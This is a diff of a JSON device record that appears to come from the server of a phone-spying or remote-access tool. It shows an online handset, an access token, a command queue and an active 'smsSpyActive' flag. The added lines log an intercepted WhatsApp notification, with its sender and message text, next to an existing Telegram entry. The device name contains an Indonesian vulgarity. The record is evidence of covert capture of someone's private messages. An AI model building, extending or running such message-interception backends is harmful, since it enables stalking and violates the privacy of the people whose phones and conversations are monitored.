@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777061827741,
+    "lastSeen": 1777061836743,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎ЈДҜДЯꚌДЅЄҪꚌЄДӍ (1293 pesan): ~ mas Anon404",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "25/04 03:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777061839697
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
